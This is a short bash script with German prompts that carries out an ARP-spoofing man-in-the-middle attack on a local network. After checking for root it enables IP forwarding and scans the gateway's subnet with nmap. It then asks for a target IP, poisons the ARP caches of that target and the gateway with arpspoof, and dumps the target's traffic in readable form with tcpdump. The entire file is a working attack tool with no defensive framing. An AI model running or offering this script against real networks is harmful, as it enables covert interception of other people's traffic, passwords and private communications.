#!/bin/bash

set -ex

if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi

echo 1 > /proc/sys/net/ipv4/ip_forward

gateway=$(route -n|grep ^0.0.0.0|cut -d' ' -f 10)

ip link
read -p "Wie heisst die Schnittstelle? [enp30s0\eth0] : " modul
nmap -sn ${gateway}/24
read -p "Wie heisst die IP? : " ip


arpspoof -i $modul -t $ip -r $gateway &

tcpdump -i $modul -A host $ip
